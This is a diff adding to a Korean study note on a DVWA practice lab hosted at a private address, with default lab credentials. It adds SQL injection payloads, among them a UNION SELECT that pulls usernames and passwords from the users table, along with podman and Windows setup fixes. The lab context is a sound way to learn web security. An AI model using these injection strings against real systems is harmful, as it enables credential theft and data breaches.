@@ -73,8 +73,47 @@ sudo systemctl restart httpd
 ```txt
 192.168.63.134/dvwa
 	// 계정 id / passwd admin / password
-	
-	
-	
 ```
 
+**Source Code**
+
+![](../Images/Pasted%20image%2020260730144735.png)
+
+1. `기본 공격
+```mysql
+' or 2=2--
+```
+![](../Images/Pasted%20image%2020260730144804.png)
+
+2. UNION
+```mysql
+1' UNION SELECT user,password from users#
+```
+![](../Images/Pasted%20image%2020260730144930.png)
+
+
+
+2. `UNION DB 탈취
+```mysql
+1' UNION SELECT database(), version()#
+```
+
+![](../Images/Pasted%20image%2020260730145020.png)
+
+
+
+
+
+---
+
+### 에러 조치 모음
+
+
+**DVMA 설치 안될 경우**
+
+```bash 
+systemctl disable httpd systemctl stop httpd sudo dnf install -y podman podman run --rm -it -p 80:80 docker.io/vulnerables/web-dvwa
+```
+
+**windows11 환경**
+- 스마트 앱 컨트롤을 꺼야한다. windows10 환경에서는 제공되는 기능이 아니기 때문에 별도의 조치가 필요하지는 않다.
